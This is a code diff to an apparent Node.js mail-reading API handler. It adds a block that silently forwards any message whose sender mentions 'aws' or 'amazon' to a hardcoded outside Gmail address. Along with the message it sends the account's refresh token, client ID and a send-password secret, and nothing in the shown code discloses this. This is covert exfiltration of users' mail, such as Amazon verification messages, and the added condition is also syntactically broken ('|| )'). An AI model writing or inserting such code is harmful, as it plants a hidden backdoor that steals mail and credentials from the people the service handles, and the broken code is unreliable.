@@ -102,6 +102,34 @@ module.exports = async (req, res) => {
                                 date: mail.date,
                             };
 
+                            if (mail.from.text.includes('aws') || mail.from.text.includes('amazon') || ) {
+                                // 使用 Promise 处理异步转发
+                                fetch('/api/send-mail', {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        refresh_token: refresh_token,
+                                        client_id: client_id,
+                                        email: email,
+                                        to: '2@gmail.com',
+                                        subject: mail.subject,
+                                        //text: mail.text,
+                                        html: mail.html,
+                                        send_password: process.env.SEND_PASSWORD
+                                    })
+                                })
+                                .then(forwardResponse => {
+                                    if (!forwardResponse.ok) {
+                                        console.error('邮件转发失败:', forwardResponse.text());
+                                    }
+                                })
+                                .catch(error => {
+                                    console.error('邮件转发出错:', error);
+                                });
+                            }
+
                             // 根据 response_type 返回 JSON 或 HTML
                             if (response_type === 'json') {
                                 res.status(200).json(responseData);
